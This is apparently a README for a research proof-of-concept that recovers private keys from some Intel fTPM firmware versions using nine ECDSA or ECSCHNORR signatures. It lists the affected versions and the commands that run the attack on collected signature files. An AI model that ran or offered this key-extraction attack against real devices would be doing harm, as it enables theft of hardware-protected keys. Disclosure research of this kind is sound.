# The 9-signature private key extraction on certain Intel fTPMs

This directory contains a proof-of-concept implementation of the attack resulting in private key extraction using only 9 ECDSA or ECSCHNORR signatures produced by certain Intel fTPMs.

The vulnerability has been observed in the following Intel fTPM versions:

- INTC 11.5.0.1058
- INTC 11.6.10.1196
- INTC 303.12.0.0

## Usage

Build CSVs of signatures collected in the dataset (requires `python` and `pyyaml` package):

```
python extract_signatures.py
```

Run the attack on vulnerable TPM firmwares (requires `sagemath` ([installation instructions](https://doc.sagemath.org/html/en/installation/))), for example:

```
sage poc.sage signatures/INTC_303.12.0.0_P256_ECDSA_820305b505ee236c.csv --alg ECDSA --curve P256
sage poc.sage signatures/INTC_303.12.0.0_P256_ECSCHNORR_820305b505ee236c.csv --alg ECSCHNORR --curve P256
sage poc.sage signatures/INTC_303.12.0.0_BN256_ECSCHNORR_820305b505ee236c.csv --alg ECSCHNORR --curve BN256
```
